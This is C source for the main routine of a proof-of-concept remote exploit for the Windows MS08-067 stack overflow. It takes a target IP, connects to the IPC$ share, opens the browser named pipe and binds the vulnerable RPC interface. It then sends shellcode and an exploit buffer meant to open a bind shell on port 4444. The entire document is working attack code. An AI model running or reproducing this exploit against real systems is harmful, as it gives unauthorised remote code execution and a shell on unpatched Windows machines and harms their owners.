int main(int argc, char* argv[])
{
	char *server;
	NETRESOURCE nr;
	char unc[MAX_PATH];
	char szPipe[MAX_PATH];
	HANDLE hFile;
	WSADATA wsa;

	int bwritten=0;
	BYTE rbuf[0x100]="";
	DWORD dw;
	PVOID	ptr = (PVOID)&POP;

	printf( "\tMS08-067 Remote Stack Overflow Vulnerability Exploit(POC)\n\n" );
	printf( "Create by Whitecell's [email protected] 2008/10/27\n" );
	printf( "Thanks isno and PolyMeta\n" );
	printf( "ShellCode Function: bindshell port:4444\n" );
	printf( "usage:\n%s [IP]\n", argv[0] );

	if ( argc != 2 ) {
	
		return 0;
	}

	if ( WSAStartup(MAKEWORD(2,2),&wsa) != 0 ) {
	
		printf( "WSAStartup failed\n" );
		return 0;
	}

	memcpy((char *)ptr + 74, bind_shellcode, sizeof(bind_shellcode)-1);

	server=argv[1];
	_snprintf(unc, sizeof(unc), "\\\\%s\\pipe", server);
	unc[sizeof(unc)-1] = 0;
	nr.dwType = RESOURCETYPE_ANY;
	nr.lpLocalName = NULL;
	nr.lpRemoteName = unc;
	nr.lpProvider = NULL;

	printf( "connect %s ipc$ .... ", server );

	if ( WNetAddConnection2(&nr, "", "", 0) != 0 ) {
	
		printf( "failed\n" );
		return 0;
	} else {
	
		printf( "success!\n" );
	}

	_snprintf(szPipe, sizeof(szPipe),"\\\\%s\\pipe\\browser",server);
	printf( "open \\\\%s\\pipe\\browser ....", server );
	hFile = CreateFile( szPipe, 
						GENERIC_READ|GENERIC_WRITE, 
						0, 
						NULL,
						OPEN_EXISTING, 0, NULL);
	if ( hFile == (HANDLE)-1 ) {
	
		printf( "failed!\n" );
		return 0;
	} else {
	
		printf( "success!\n" );
	}

	printf( "Bind Rpc 4b324fc8-1670-01d3-1278-5a47bf6ee188 Interface\n" );
	BindRpcInterface(hFile,"4b324fc8-1670-01d3-1278-5a47bf6ee188","3.0");

	printf( "Send shellcode ....\n" );
	TransactNamedPipe(hFile, (PVOID)&POP, sizeof(POP) - 1, rbuf, sizeof(rbuf), &dw, NULL);

	printf( "Send Exploit ...... \n" );
	TransactNamedPipe(hFile, (PVOID)&EXPLOIT, sizeof(EXPLOIT) - 1, rbuf, sizeof(rbuf), &dw, NULL);

	CloseHandle( hFile );

	return 0;
}